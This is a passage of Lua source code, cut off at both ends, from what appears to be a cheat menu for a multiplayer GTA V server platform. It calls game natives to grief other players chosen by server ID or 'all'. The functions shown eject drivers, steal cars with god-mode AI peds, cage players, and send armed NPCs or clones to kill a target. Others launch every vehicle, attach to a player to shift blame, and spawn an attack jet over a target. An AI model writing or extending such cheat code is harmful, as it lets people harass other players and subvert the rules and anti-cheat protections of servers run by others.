            wmlua.F.EventLogInsert("[~b~WM~w~] " .. #_asid .. " Players given armor", 3000)
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.ptm) ~= "all" then wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm) end
            if tonumber(wmlua.V.ptm) ~= -69 then
                wmlua.V.HCoords = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.ptm))
                wmlua.H.WMInvokeNative(0x673966A0C0FD7171, wmlua.N.GetHashKey("pickup_armour_standard"), wmlua.V.HCoords.x, wmlua.V.HCoords.y, wmlua.V.HCoords.z + 1.0, 1, 100, wmlua.N.GetHashKey("pickup_armour_standard"), 1, 0)
                wmlua.F.EventLogInsert("[~b~WM~w~] Player given armor", 3000)
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
            end
        end

    end

    function wmlua.F.OTHTPToPlayerCar(_asid)

        if _asid then
            for i = 1, #_asid do
                if i == #_asid then
                    wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                    wmlua.V._TargetVeh = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(wmlua.V.ptm), false)
                    if wmlua.N.IsAnyVehicleSeatEmpty(wmlua.V._TargetVeh) then
                        wmlua.N.TaskWarpPedIntoVehicle(wmlua.N.GetPlayerPed(), wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(wmlua.V.ptm), false), -2)
                        wmlua.F.EventLogInsert("[~b~WM~w~] Teleported inside " .. wmlua.N.GetPlayerName(wmlua.V.ptm) .. "'s vehicle", 3000)
                    else
                        wmlua.F.EventLogInsert("[~r~WM~w~] No seats available", 3000)
                    end
                end
            end
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id")
            wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm)
            if tonumber(wmlua.V.ptm) ~= -69 then
                wmlua.V._TargetVeh = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(wmlua.V.ptm), false)
                if wmlua.N.IsAnyVehicleSeatEmpty(wmlua.V._TargetVeh) then
                    wmlua.N.TaskWarpPedIntoVehicle(wmlua.N.GetPlayerPed(), wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(ptm), false), -2)
                    wmlua.F.EventLogInsert("[~b~WM~w~] Teleported inside " .. wmlua.N.GetPlayerName(wmlua.V.ptm) .. "'s vehicle", 3000)
                else
                    wmlua.F.EventLogInsert("[~r~WM~w~] No seats available", 3000)
                end
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
            end
        end

    end

    function wmlua.F.OTHTPToPlayer(_asid)

        if _asid then
            for i = 1, #_asid do
                if i == #_asid then
                    wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                    if tonumber(wmlua.V.ptm) ~= -69 then
                        wmlua.F.TeleportToCoords(table.unpack(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.ptm))))
                    else
                        wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
                    end
                end
            end
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.ptm) ~= "all" then wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm) end
            if tonumber(wmlua.V.ptm) ~= -69 then
                wmlua.F.TeleportToCoords(table.unpack(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.ptm))))
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
            end
        end

    end

    function wmlua.F.OTHKickDriver(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.t = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.tPed = wmlua.N.GetPlayerPed(wmlua.V.t)
                wmlua.V.pVehicle = wmlua.N.GetVehiclePedIsIn(wmlua.V.tPed, true)
                wmlua.H.WMInvokeNative(0xB69317BF5E782347, wmlua.V.pVehicle)
                wmlua.V.tPed = wmlua.N.GetPedInVehicleSeat(wmlua.V.pVehicle, -1)
                wmlua.N.Clear_PedTasks(wmlua.V.tPed, true)
            end
        else
            wmlua.V.t = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.t) ~= "all" then wmlua.V.t = wmlua.F.SIDToPID(wmlua.V.t) end
            wmlua.V.tPed = wmlua.N.GetPlayerPed(wmlua.V.t)

            if tonumber(wmlua.V.t) ~= -69 then
                wmlua.V.pVehicle = wmlua.N.GetVehiclePedIsIn(wmlua.V.tPed, true)
                wmlua.H.WMInvokeNative(0xB69317BF5E782347, wmlua.V.pVehicle)
                wmlua.V.tPed = wmlua.N.GetPedInVehicleSeat(wmlua.V.pVehicle, -1)
                wmlua.N.Clear_PedTasks(wmlua.V.tPed, true)
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
            end
        end

    end

    function wmlua.F.OTHAiThief(_asid)

        wmlua_Thread(function()

            if _asid then
                wmlua.V.aiPedGM = wmlua.F.GetInput("Godmode the ped? (y/n)")
                for i = 1, #_asid do
                    wmlua.V.t = wmlua.F.SIDToPID(_asid[i])
                    wmlua.V.tPed = wmlua.N.GetPlayerPed(wmlua.V.t)
    
                    if tonumber(wmlua.V.t) ~= -69 then
    
                        wmlua.V.pVehicle = wmlua.N.GetVehiclePedIsIn(wmlua.V.tPed, true)
                        wmlua.H.WMInvokeNative(0xB69317BF5E782347, wmlua.V.pVehicle)
                        wmlua.V.tPed = wmlua.N.GetPedInVehicleSeat(wmlua.V.pVehicle, -1)
                        wmlua.V.taken = false
                        for i = 1, 20 do
                            if not wmlua.V.taken and wmlua.V.Active then
                                repeat
                                    wmlua.N.Clear_PedTasks(wmlua.V.tPed, true)
                                    wmlua.H.WMInvokeNative(0xB69317BF5E782347, wmlua.V.pVehicle)
                                    wmlua.F.RequestMdl(1885233650)
                                    wmlua.V.crazyPed = wmlua.N.CreatePedInsideVehicle(wmlua.V.pVehicle, 4, 1885233650, -1, true, true)
                                    wmlua.F.RequestControl(wmlua.V.crazyPed)
                                    if wmlua.V.aiPedGM == "y" then
                                        wmlua.H.WMInvokeNative(0x3882114BDE571AD4, wmlua.V.crazyPed, true)
                                    end
                                    wmlua.N.SetBlockingOfNonTemporaryEvents(wmlua.V.crazyPed, true)
                                    wmlua.N.TaskVehicleDriveWander(wmlua.V.crazyPed, wmlua.V.pVehicle, 800.0, 787004)
                                    if wmlua.V.crazyPed and wmlua.N.GetPedInVehicleSeat(wmlua.V.pVehicle, -1) == wmlua.V.crazyPed then
                                        wmlua.V.taken = true
                                        if not wmlua.V.Active then
                                            wmlua.V.taken = true
                                        end
                                    end
                                    wmlua_Schleep(125)
                                until wmlua.V.taken
                            end
                            if wmlua.V.crazyPed then
                                wmlua.F.RequestControl(wmlua.V.crazyPed)
                                wmlua.N.SetBlockingOfNonTemporaryEvents(wmlua.V.crazyPed, true)
                                wmlua.N.TaskVehicleDriveWander(wmlua.V.crazyPed, wmlua.V.pVehicle, 800.0, 787004)
                                wmlua.N.SetDriverAbility(wmlua.V.crazyPed, 1.0)
                            end
                        end
                    end
                end
            else
                wmlua.V.t = wmlua.F.GetInput("Enter Player Server Id")
                wmlua.V.aiPedGM = wmlua.F.GetInput("Godmode the ped? (y/n)")
                if string.lower(wmlua.V.t) ~= "all" then wmlua.V.t = wmlua.F.SIDToPID(wmlua.V.t) end
                wmlua.V.tPed = wmlua.N.GetPlayerPed(wmlua.V.t)
    
                if tonumber(wmlua.V.t) ~= -69 then
    
                    wmlua.V.pVehicle = wmlua.N.GetVehiclePedIsIn(wmlua.V.tPed, true)
                    wmlua.H.WMInvokeNative(0xB69317BF5E782347, wmlua.V.pVehicle)
                    wmlua.V.tPed = wmlua.N.GetPedInVehicleSeat(wmlua.V.pVehicle, -1)
                    wmlua.V.taken = false
                    for i = 1, 20 do
                        if not wmlua.V.taken and wmlua.V.Active then
                            repeat
                                wmlua.N.Clear_PedTasks(wmlua.V.tPed, true)
                                wmlua.H.WMInvokeNative(0xB69317BF5E782347, wmlua.V.pVehicle)
                                wmlua.F.RequestMdl(1885233650)
                                wmlua.V.crazyPed = wmlua.N.CreatePedInsideVehicle(wmlua.V.pVehicle, 4, 1885233650, -1, true, true)
                                wmlua.F.RequestControl(wmlua.V.crazyPed)
                                if wmlua.V.aiPedGM == "y" then
                                    wmlua.H.WMInvokeNative(0x3882114BDE571AD4, wmlua.V.crazyPed, true)
                                end
                                wmlua.N.SetBlockingOfNonTemporaryEvents(wmlua.V.crazyPed, true)
                                wmlua.N.TaskVehicleDriveWander(wmlua.V.crazyPed, wmlua.V.pVehicle, 800.0, 787004)
                                if wmlua.V.crazyPed and wmlua.N.GetPedInVehicleSeat(wmlua.V.pVehicle, -1) == wmlua.V.crazyPed then
                                    wmlua.V.taken = true
                                    if not wmlua.V.Active then
                                        wmlua.V.taken = true
                                    end
                                end
                                wmlua_Schleep(125)
                            until wmlua.V.taken
                        end
                        if wmlua.V.crazyPed then
                            wmlua.F.RequestControl(wmlua.V.crazyPed)
                            wmlua.N.SetBlockingOfNonTemporaryEvents(wmlua.V.crazyPed, true)
                            wmlua.N.TaskVehicleDriveWander(wmlua.V.crazyPed, wmlua.V.pVehicle, 800.0, 787004)
                            wmlua.N.SetDriverAbility(wmlua.V.crazyPed, 1.0)
                        end
                    end
    
                else
    
                    wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
    
                end
            end

        end)

    end

    wmlua.V.activeIncident = false
    
    function wmlua.F.PLYProvokeKillers()

        if not wmlua.V.activeIncident then

            wmlua.V.inp = wmlua.F.GetInput("Enter Type ( merry / gang )")
            if wmlua.V.inp == "merry" then

                _, wmlua.V.activeIncident = wmlua.N.CreateIncidentWithEntity(14, wmlua.N.GetPlayerPed(), 150, 3.0)
                wmlua.F.EventLogInsert("[~b~WM~w~] Merryweather Sent | " .. wmlua.V.activeIncident, 2500)

            elseif wmlua.V.inp == "gang" then

                _, wmlua.V.activeIncident = wmlua.N.CreateIncidentWithEntity(11, wmlua.N.GetPlayerPed(), 150, 3.0)
                wmlua.F.EventLogInsert("[~b~WM~w~] Gangsters Sent | " .. wmlua.V.activeIncident, 2500)

            end

        else

            wmlua.F.EventLogInsert('[~b~WM~w~] Stopped Incident ' .. wmlua.V.activeIncident, 3000)
            wmlua.N.DeleteIncident(wmlua.V.activeIncident)
            wmlua.V.activeIncident = nil

        end

    end

    function wmlua.F.PLYChangeModel()

        wmlua.V.ctm = wmlua.N.GetHashKey(wmlua.F.GetInput("Enter Model Name"))

        if wmlua.F.RequestMdl(wmlua.V.ctm) then
            wmlua.N.SetPlayerModel(wmlua.N.PlayerId(), wmlua.V.ctm)
        end

    end

    function wmlua.F.PLYInvisibility()

        wmlua.F.CFS("wmlua.V.Ply_invisibility")

    end

    function wmlua.F.PLYOutfitRandomize()

        wmlua.N.SetPedRandomComponentVariation(wmlua.N.GetPlayerPed(), false)

    end

    function wmlua.F.PLYClean()

        wmlua.N.ClearPedBloodDamage(wmlua.N.GetPlayerPed())
        wmlua.N.ResetPedVisibleDamage(wmlua.N.GetPlayerPed())
        wmlua.F.EventLogInsert('[~b~WM~w~] Cleaned', 2500)

    end

    function wmlua.F.PLYHeal()

        wmlua.N.SetEntityHealth(wmlua.N.GetPlayerPed(), wmlua.H.WMInvokeNative(0x15D757606D170C3C, wmlua.N.GetPlayerPed()))
        wmlua.F.EventLogInsert('[~b~WM~w~] Healed', 2500)

    end

    function wmlua.F.PLYArmor()

        if wmlua.N.GetPedArmor(wmlua.N.GetPlayerPed()) > 0 then
            wmlua.H.WMInvokeNative(0xCEA04D83135264CC, wmlua.N.GetPlayerPed(), 0)
            wmlua.F.EventLogInsert('[~b~WM~w~] Removed armor', 2500)
        else
            wmlua.H.WMInvokeNative(0xCEA04D83135264CC, wmlua.N.GetPlayerPed(), GetPlayerMaxArmour(wmlua.N.PlayerId()))
            wmlua.F.EventLogInsert('[~b~WM~w~] Added armor', 2500)
        end

    end

    function wmlua.F.PLYInsuranceFraud()
        wmlua_Thread(function()
            local health = wmlua.H.WMInvokeNative(0xEEF059FAD016D209, wmlua.N.GetPlayerPed())
            wmlua.H.WMInvokeNative(0x5DB660B38DD98A31, wmlua.N.PlayerId(), 0.0)
            wmlua.N.SetPedRagdollOnCollision(wmlua.N.GetPlayerPed(), true)
            wmlua.N.SetEntityHealth(wmlua.N.GetPlayerPed(), 101)
            repeat wmlua_Schleep(0) wmlua.V.IFhealth = wmlua.H.WMInvokeNative(0xEEF059FAD016D209, wmlua.N.GetPlayerPed()) until wmlua.V.IFhealth == false
            wmlua.H.WMInvokeNative(0x5DB660B38DD98A31, wmlua.N.PlayerId(), 1.0)
        end)
    end

    function wmlua.F.PLYSuicide()

        wmlua.N.SetEntityHealth(wmlua.N.GetPlayerPed(), 0)

    end

    function wmlua.F.MALLaunchCars()

        local vehList = wmlua.N.GetEntList("CVehicle")
        wmlua.N.EventLogInsert(tostring(#vehList))
        for i = 1, #vehList do
            wmlua.F.RequestControl(vehList[i])
            if wmlua.N.IsPedAPlayer(wmlua.N.GetPedInVehicleSeat(vehList[i], -1)) then
                wmlua.N.Clear_PedTasks(wmlua.N.GetPedInVehicleSeat(vehList[i], -1), true)
            end
            wmlua.H.WMInvokeNative(0xC5F68BE9613E2D18, vehList[i], 0, 0.0, 0.0, 2000.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
        end
        if wmlua.F.HoldingCTRL(0, 21) then
            wmlua.F.MALLaunchCars()
        end
        if wmlua.F.PressedCTRL(0, 21) then
            wmlua.F.EventLogInsert('[~b~WM~w~] Launched Cars', 1000)
        end

    end

    wmlua.V.PlayerToDragBlame = 0

    function wmlua.F.MALDragBlame(_asid)

        if not wmlua.V.Mal_dragblame then

            if _asid then
                for i = 1, #_asid do
                    if i == #_asid then
                        wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                        wmlua.V.tsid = wmlua.N.GetPlayerServerId(wmlua.V.target)
                        wmlua.V.PlayerToDragBlame = wmlua.N.GetPlayerPed(wmlua.V.target)
                        wmlua.N.AttachEntityToEntity(wmlua.N.GetPlayerPed(), wmlua.V.PlayerToDragBlame, 11816, 0.54, 0.54, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        wmlua.F.CFT("wmlua.V.Mal_dragblame", "Drag Blame " .. wmlua.V.tsid)
                    end
                end
            else
                wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
                if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
                wmlua.V.tsid = wmlua.N.GetPlayerServerId(wmlua.V.target)
                wmlua.V.PlayerToDragBlame = wmlua.N.GetPlayerPed(wmlua.V.target)
                wmlua.N.AttachEntityToEntity(wmlua.N.GetPlayerPed(), wmlua.V.PlayerToDragBlame, 11816, 0.54, 0.54, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                wmlua.F.CFT("wmlua.V.Mal_dragblame", "Drag Blame " .. wmlua.V.tsid)
            end

        else

            wmlua.N.DetachEntity(wmlua.N.GetPlayerPed())
            wmlua.F.CFT("wmlua.V.Mal_dragblame", "Drag Blame")

        end

        wmlua.V.Mal_dragblame = not wmlua.V.Mal_dragblame

    end

    function wmlua.F.MALCagePlayer(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.Hash_cageobj = wmlua.N.GetHashKey("prop_container_ld_pu")
                if wmlua.V.target ~= -69 then
                    wmlua_Thread(function()
                        wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(wmlua.V.target), true)
                        wmlua.V.CageCoords = wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.N.GetPlayerPed(wmlua.V.target), 0.0, 0.0, -1.0)
                        wmlua.V.CageObj = wmlua.N.SpawnObj(wmlua.V.Hash_cageobj, wmlua.V.CageCoords, true, false, true)
                    end)
                end
            end
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            wmlua.V.Hash_cageobj = wmlua.N.GetHashKey("prop_container_ld_pu")
            if wmlua.V.target ~= -69 then
                wmlua_Thread(function()
                    wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(wmlua.V.target), true)
                    wmlua.V.CageCoords = wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.N.GetPlayerPed(wmlua.V.target), 0.0, 0.0, -1.0)
                    wmlua.V.CageObj = wmlua.N.SpawnObj(wmlua.V.Hash_cageobj, wmlua.V.CageCoords, true, false, true)
                end)
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
            end
        end


    end

    function wmlua.F.MALPedAttack(_asid)

        if _asid then
            wmlua.V.pedWep = wmlua.F.GetInput("Enter Weapon Name for Ped")
            if not string.find(wmlua.V.pedWep, 'weapon_') and not string.find(wmlua.V.pedWep, 'gadget_') then
                wmlua.V.pedWep = 'weapon_' .. wmlua.V.pedWep
            elseif string.find(wmlua.V.pedWep, 'parachute') and not string.find(wmlua.V.pedWep, 'gadget_') then
                wmlua.V.pedWep = 'gadget_' .. wmlua.V.pedWep
            end
            for i = 1, #_asid do
                wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                local coords = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.target))
                local pList = wmlua.N.GetEntList("CPed")
                for i = 1, #pList do
                    if wmlua.N.IsPedHuman(pList[i]) and pList[i] ~= wmlua.N.GetPlayerPed(wmlua.V.target) and not wmlua.N.IsPedAPlayer(pList[i]) and wmlua.N.GetDistanceBetweenCoords(coords, wmlua.N.GetEntityPos(pList[i])) < 2000 then
                        wmlua.H.WMInvokeNative(0xE1EF3C1216AFF2CD, k)
                        wmlua.N.TaskCombatPed(pList[i], wmlua.N.GetPlayerPed(wmlua.V.target), 0, 16)
                        wmlua.N.SetPedAlertness(pList[i], 100)
                        wmlua.N.SetPedAccuracy(pList[i], 100)
                        wmlua.N.SetPedCanSwitchWeapon(pList[i], true)
                        wmlua.N.AddArmourToPed(pList[i], 200)
                        wmlua.N.SetPedShootRate(pList[i], 1000)
                        wmlua.N.SetPedFleeAttributes(pList[i], 0, 0)
                        wmlua.N.SetPedPathAvoidFire(pList[i],  1)
                        wmlua.N.SetPedCanUseLadders(pList[i], 1)
                        wmlua.N.SetPedPathCanDropFromHeight(pList[i], 1)
                        wmlua.N.SetPedPathPreferToAvoidWater(pList[i], 1)
                        wmlua.N.SetPedGeneratesDeadBodyEvents(pList[i], 1)
                        wmlua.N.SetPedCombatAbility(pList[i], 100)
                        wmlua.N.SetPedCombatRange(pList[i], 2)
                        wmlua.N.SetPedCombatAttributes(pList[i], 46, 1)
                        wmlua.N.SetPedCombatAttributes(pList[i], 5, 1)
                        wmlua.N.SetPedCombatMovement(pList[i], 3)
                        wmlua.N.SetPedRelationshipGroupHash(pList[i], wmlua.N.GetHashKey("security_guard"))
                        wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, pList[i], wmlua.N.GetHashKey(wmlua.V.pedWep), 250, false, true, true)
                    end
                end
            end
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            wmlua.V.pedWep = wmlua.F.GetInput("Enter Weapon Name for Ped")
    
            if not string.find(wmlua.V.pedWep, 'weapon_') and not string.find(wmlua.V.pedWep, 'gadget_') then
                wmlua.V.pedWep = 'weapon_' .. wmlua.V.pedWep
            elseif string.find(wmlua.V.pedWep, 'parachute') and not string.find(wmlua.V.pedWep, 'gadget_') then
                wmlua.V.pedWep = 'gadget_' .. wmlua.V.pedWep
            end
    
            if wmlua.V.target ~= -69 then
                local coords = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.target))
                local pList = wmlua.N.GetEntList("CPed")
                for i = 1, #pList do
                    if wmlua.N.IsPedHuman(pList[i]) and pList[i] ~= wmlua.N.GetPlayerPed(wmlua.V.target) and not wmlua.N.IsPedAPlayer(pList[i]) and wmlua.N.GetDistanceBetweenCoords(coords, wmlua.N.GetEntityPos(pList[i])) < 2000 then
                        wmlua.H.WMInvokeNative(0xE1EF3C1216AFF2CD, k)
                        wmlua.N.TaskCombatPed(pList[i], wmlua.N.GetPlayerPed(wmlua.V.target), 0, 16)
                        wmlua.N.SetPedAlertness(pList[i], 100)
                        wmlua.N.SetPedAccuracy(pList[i], 100)
                        wmlua.N.SetPedCanSwitchWeapon(pList[i], true)
                        wmlua.N.AddArmourToPed(pList[i], 200)
                        wmlua.N.SetPedShootRate(pList[i], 1000)
                        wmlua.N.SetPedFleeAttributes(pList[i], 0, 0)
                        wmlua.N.SetPedPathAvoidFire(pList[i],  1)
                        wmlua.N.SetPedCanuseLadders(pList[i], 1)
                        wmlua.N.SetPedPathCanDropFromHeight(pList[i], 1)
                        wmlua.N.SetPedPathPreferToAvoidWater(pList[i], 1)
                        wmlua.N.SetPedGeneratesDeadBodyEvents(pList[i], 1)
                        wmlua.N.SetPedCombatAbility(pList[i], 100)
                        wmlua.N.SetPedCombatRange(pList[i], 2)
                        wmlua.N.SetPedCombatAttributes(pList[i], 46, 1)
                        wmlua.N.SetPedCombatAttributes(pList[i], 5, 1)
                        wmlua.N.SetPedCombatMovement(pList[i], 3)
                        wmlua.N.SetPedRelationshipGroupHash(pList[i], wmlua.N.GetHashKey("security_guard"))
                        wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, pList[i], wmlua.N.GetHashKey(wmlua.V.pedWep), 250, false, true, true)
                    end
                end
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
            end
        end

    end

    function wmlua.F.MALCloneAttack(_asid)

        if _asid then
            wmlua.V.PedWeapon = wmlua.F.GetInput("Enter Weapon Name for Ped")
            wmlua.V.ClonesAmount = wmlua.F.GetInput("Enter Amount of Clones")
            wmlua.V.GodPed = wmlua.F.GetInput("Godmode? (y/n)")

            if not string.find(wmlua.V.PedWeapon, 'weapon_') and not string.find(wmlua.V.PedWeapon, 'gadget_') then
                wmlua.V.PedWeapon = 'weapon_' .. wmlua.V.PedWeapon
            elseif string.find(wmlua.V.PedWeapon, 'parachute') and not string.find(wmlua.V.PedWeapon, 'gadget_') then
                wmlua.V.PedWeapon = 'gadget_' .. wmlua.V.PedWeapon
            end

            for i = 1, #_asid do
                wmlua.V.CloneTarget = wmlua.N.GetPlayerPed(wmlua.F.SIDToPID(_asid[i]))
                for i = 1, tonumber(wmlua.V.ClonesAmount) do
                    wmlua.V.pToC = wmlua.N.GetEntityModel(wmlua.V.CloneTarget)
    
                    wmlua.F.RequestMdl(wmlua.V.pToC)
    
                    wmlua.V.x,wmlua.V.y,wmlua.V.z = table.unpack(wmlua.N.GetEntityPos(wmlua.V.CloneTarget))
    
                    wmlua.V.ClonePed = wmlua.N.SpawnPed(5, wmlua.V.pToC, wmlua.V.x,wmlua.V.y,wmlua.V.z, 0.0, true, true)
                    if wmlua.V.GodPed == "y" then
                        wmlua.N.WadaGM(wmlua.V.ClonePed, true, 16.1337)
                    end
                    wmlua.N.SetPedRelationshipGroupHash(wmlua.V.ClonePed, wmlua.N.GetHashKey("security_guard"))
                    wmlua.H.WMInvokeNative(0xE952D6431689AD9A, wmlua.V.CloneTarget, wmlua.V.ClonePed)
                    wmlua.N.TaskCombatPed(wmlua.V.ClonePed, wmlua.V.CloneTarget, 0, 16)
                    wmlua.N.SetPedConfigFlag(wmlua.V.ClonePed, 52, true)
                    wmlua.N.SetPedAlertness(wmlua.V.ClonePed, 100)
                    wmlua.N.SetPedAccuracy(wmlua.V.ClonePed, 100)
                    wmlua.N.SetPedCanSwitchWeapon(wmlua.V.ClonePed, true)
                    wmlua.N.SetPedShootRate(wmlua.V.ClonePed, 1000)
                    wmlua.N.SetPedFleeAttributes(wmlua.V.ClonePed, 0, 0)
                    wmlua.N.SetPedPathAvoidFire(wmlua.V.ClonePed,  1)
                    wmlua.N.SetPedCanUseLadders(wmlua.V.ClonePed, 1)
                    wmlua.N.SetPedPathCanDropFromHeight(wmlua.V.ClonePed, 1)
                    wmlua.N.SetPedPathPreferToAvoidWater(wmlua.V.ClonePed, 1)
                    wmlua.N.SetPedGeneratesDeadBodyEvents(wmlua.V.ClonePed, 1)
                    wmlua.N.SetPedCombatAbility(wmlua.V.ClonePed, 100)
                    wmlua.N.SetPedCombatRange(wmlua.V.ClonePed, 2)
                    wmlua.N.SetPedCombatAttributes(wmlua.V.ClonePed, 46, 1)
                    wmlua.N.SetPedCombatAttributes(wmlua.V.ClonePed, 5, 1)
                    wmlua.N.SetPedCombatMovement(wmlua.V.ClonePed, 3)
                    wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.V.ClonePed, wmlua.N.GetHashKey(wmlua.V.PedWeapon), 250, false, true, true)
                    wmlua_Schleep(0)
                end
            end
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            wmlua.V.PedWeapon = wmlua.F.GetInput("Enter Weapon Name for Ped")
            wmlua.V.ClonesAmount = wmlua.F.GetInput("Enter Amount of Clones")
            wmlua.V.GodPed = wmlua.F.GetInput("Godmode? (y/n)")
            wmlua.V.CloneTarget = wmlua.N.GetPlayerPed(wmlua.V.target)
    
            if not string.find(wmlua.V.PedWeapon, 'weapon_') and not string.find(wmlua.V.PedWeapon, 'gadget_') then
                wmlua.V.PedWeapon = 'weapon_' .. wmlua.V.PedWeapon
            elseif string.find(wmlua.V.PedWeapon, 'parachute') and not string.find(wmlua.V.PedWeapon, 'gadget_') then
                wmlua.V.PedWeapon = 'gadget_' .. wmlua.V.PedWeapon
            end
    
            if wmlua.V.target ~= -69 then
    
                for i = 1, tonumber(wmlua.V.ClonesAmount) do
                    wmlua.V.pToC = wmlua.N.GetEntityModel(wmlua.V.CloneTarget)
    
                    wmlua.F.RequestMdl(wmlua.V.pToC)
    
                    wmlua.V.x,wmlua.V.y,wmlua.V.z = table.unpack(wmlua.N.GetEntityPos(wmlua.V.CloneTarget))
    
                    wmlua.V.ClonePed = wmlua.N.SpawnPed(5, wmlua.V.pToC, wmlua.V.x,wmlua.V.y,wmlua.V.z, 0.0, true, true)
                    if wmlua.V.GodPed then
                        wmlua.N.WadaGM(wmlua.V.ClonePed, true, 16.1337)
                    end
                    wmlua.N.SetPedRelationshipGroupHash(wmlua.V.ClonePed, wmlua.N.GetHashKey("security_guard"))
                    wmlua.H.WMInvokeNative(0xE952D6431689AD9A, wmlua.V.CloneTarget, wmlua.V.ClonePed)
                    wmlua.N.TaskCombatPed(wmlua.V.ClonePed, wmlua.V.CloneTarget, 0, 16)
                    wmlua.N.SetPedConfigFlag(wmlua.V.ClonePed, 52, true)
                    wmlua.N.SetPedAlertness(wmlua.V.ClonePed, 100)
                    wmlua.N.SetPedAccuracy(wmlua.V.ClonePed, 100)
                    wmlua.N.SetPedCanSwitchWeapon(wmlua.V.ClonePed, true)
                    wmlua.N.SetPedShootRate(wmlua.V.ClonePed, 1000)
                    wmlua.N.SetPedFleeAttributes(wmlua.V.ClonePed, 0, 0)
                    wmlua.N.SetPedPathAvoidFire(wmlua.V.ClonePed,  1)
                    wmlua.N.SetPedCanUseLadders(wmlua.V.ClonePed, 1)
                    wmlua.N.SetPedPathCanDropFromHeight(wmlua.V.ClonePed, 1)
                    wmlua.N.SetPedPathPreferToAvoidWater(wmlua.V.ClonePed, 1)
                    wmlua.N.SetPedGeneratesDeadBodyEvents(wmlua.V.ClonePed, 1)
                    wmlua.N.SetPedCombatAbility(wmlua.V.ClonePed, 100)
                    wmlua.N.SetPedCombatRange(wmlua.V.ClonePed, 2)
                    wmlua.N.SetPedCombatAttributes(wmlua.V.ClonePed, 46, 1)
                    wmlua.N.SetPedCombatAttributes(wmlua.V.ClonePed, 5, 1)
                    wmlua.N.SetPedCombatMovement(wmlua.V.ClonePed, 3)
                    wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.V.ClonePed, wmlua.N.GetHashKey(wmlua.V.PedWeapon), 250, false, true, true)
                end
    
            else
    
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
    
            end
        end

    end

    function wmlua.F.MALAttackPlane(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.TargetPed = wmlua.N.GetPlayerPed(wmlua.V.target)
                wmlua.V._bx,wmlua.V._by,wmlua.V._bz = table.unpack(wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.V.TargetPed, 0.0, 0.0, 1400.0))
                wmlua.F.RequestMdl(wmlua.N.GetHashKey("strikeforce"))
                wmlua.F.RequestMdl(wmlua.N.GetHashKey("s_m_y_pilot_01"))
                wmlua.V._ATTACKPLANE = wmlua.N.SpawnVeh(wmlua.N.GetHashKey("strikeforce"), wmlua.V._bx, wmlua.V._by, wmlua.V._bz, wmlua.N.GetEntityHeading(wmlua.V.TargetPed), true, true)
                wmlua.V._ATTACKPLANEPILOT = wmlua.N.CreatePedInsideVehicle(wmlua.V._ATTACKPLANE, 29, wmlua.N.GetHashKey("s_m_y_pilot_01"), -1, true, true)
                wmlua.V._ATTACKPLANEROT = wmlua.N.GetEntityRotation(wmlua.V._ATTACKPLANE,2)
    
                wmlua_Thread(function()
                    for i = 1, 5 do
